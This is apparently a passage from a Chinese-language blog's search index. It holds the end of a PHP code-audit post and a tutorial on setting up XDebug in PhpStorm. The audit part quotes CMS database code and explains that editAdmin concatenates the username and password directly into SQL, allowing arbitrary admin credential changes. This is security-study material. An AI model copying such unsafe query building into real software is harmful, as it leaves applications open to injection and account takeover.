class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"><span class="hljs-variable">$_sql</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>(<span class="hljs-variable">$_sql</span>)-&gt;<span class="hljs-title function_ invoke__">rowCount</span>();<br>    &#125;<br></code></pre></td></tr></table></figure><p>调用execute函数去执行sql语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params"><span class="hljs-variable">$_sql</span></span>)</span>&#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-variable">$_stmt</span>=<span class="hljs-variable language_">$this</span>-&gt;_db-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-variable">$_sql</span>);<br>            <span class="hljs-variable">$_stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>        &#125;<span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>)&#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;SQL语句:&#x27;</span>.<span class="hljs-variable">$_sql</span>.<span class="hljs-string">&#x27;&lt;br /&gt;错误信息:&#x27;</span>.<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$_stmt</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这一系列的操作主要是用来生成SQL语句然后执行SQL语句，editAdmin函数直接把传进来的username password拼接到sql语句中，然后去更新相关表中id&#x3D;1的数据，这也就造成了任意更改管理员账号密码</p>]]></content>
    
    
    <categories>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP 代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP storm 配置 XDebug</title>
    <link href="/2025/07/08/PHP%20storm%20%E9%85%8D%E7%BD%AE%20XDebug/"/>
    <url>/2025/07/08/PHP%20storm%20%E9%85%8D%E7%BD%AE%20XDebug/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP-storm-配置-XDebug"><a href="#PHP-storm-配置-XDebug" class="headerlink" title="PHP storm 配置 XDebug"></a>PHP storm 配置 XDebug</h1><p>在小皮面板找到对应版本，打开XDebug组件</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080957606.png" alt="20250708133948343"></p><p><strong>php.ini配置：（配置完成后重启服务）</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080957876.png" alt="20250708134137512"></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Xdebug]</span><br><span class="hljs-attr">zend_extension</span>=D:/CTF-Tools/phpstudy_pro/Extensions/php/php5.<span class="hljs-number">5.9</span>nts/ext/php_xdebug.dll<br><span class="hljs-attr">xdebug.collect_params</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">xdebug.collect_return</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">xdebug.auto_trace</span>=<span class="hljs-literal">Off</span><br><span class="hljs-attr">xdebug.trace_output_dir</span>=D:/CTF-Tools/phpstudy_pro/Extensions/php_log/php5.<span class="hljs-number">5.9</span>nts.xdebug.trace<br><span class="hljs-attr">xdebug.profiler_enable</span>=<span class="hljs-literal">Off</span><br><span class="hljs-attr">xdebug.profiler_output_dir</span>=<span class="hljs-string">&quot;D:\CTF-Tools\phpstudy_pro\Extensions\tmp\xdebug&quot;</span><br><span class="hljs-attr">xdebug.remote_enable</span>=<span class="hljs-literal">On</span><br><span class="hljs-attr">xdebug.remote_host</span>=localhost<br><span class="hljs-attr">xdebug.remote_port</span>=<span class="hljs-number">9100</span><br><span class="hljs-attr">xdebug.remote_handler</span>=dbgp<br><span class="hljs-attr">xdebug.mode</span>=debug<br><span class="hljs-attr">xdebug.idekey</span> = PHPSTORM<br><span class="hljs-attr">xdebug.remote_enable</span>=<span class="hljs-literal">On</span><br></code></pre></td></tr></table></figure><p><strong>接下来打开PHP storm设置：</strong></p><p>-&gt;PHP&gt;调试&gt;DBGp代理           </p><p>IDE 键：<strong>PHPSTORM</strong><code>xdebug.idekey = PHPSTORM</code></p><p>主机：<strong>localhost</strong><code>xdebug.remote_host=localhost</code></p><p>端口：<strong>9001</strong><code>xdebug.remote_port=9100</code></p><p>将端口对应 <code>xdebug.remote_port=9100</code> php.ini 配置为 <strong>9100</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080957897.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080959634.png" alt="20250708134451487"></p><p>-&gt;PHP&gt;服务器    </p><p>名称：yccms （随意）</p><p>主机：<strong>localhost</strong><code>xdebug.remote_host=localhost</code></p><p>端口：80          （保持默认 80 即可）</p><p>调试器：<strong>Xdebug</strong></p><ul><li><input checked="" disabled="" type="checkbox"> 使用路径映射</li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080959883.png" alt="20250708134711734"></p><p>运行一个新的 PHP web 配置</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080959990.png" alt="20250708134943149"></p><p>服务器：yccms（选择上一步配置好的服务器）</p><p>起始URL: <a href="http://localhost:7676/">http://localhost:7676</a>    （此处的端口对应上 xp 搭建网站时的端口）</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508081000588.png" alt="20250708135039223"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508081000527.png" alt="20250708135256894"></p><p>验证一下：</p><p>除了下面的三个黄标，其他没有问题就可以正常使用调试了</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508081000114.png" alt="20250708135357214"></p>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
